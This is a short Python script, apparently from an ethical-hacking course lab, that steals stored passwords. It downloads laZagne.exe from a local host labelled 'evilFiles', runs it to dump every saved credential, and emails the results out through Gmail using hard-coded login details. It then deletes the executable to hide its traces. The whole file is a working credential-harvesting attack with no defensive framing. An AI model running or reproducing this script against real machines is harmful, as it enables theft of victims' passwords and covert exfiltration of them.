#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()  # Get OS temp directory path
os.chdir(temp_directory)  # Change current directory to temp
download("http://10.0.2.4/evilFiles/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("yelp.camp.mailer.123@gmail.com", "yelp.camp", result)
os.remove("laZagne.exe")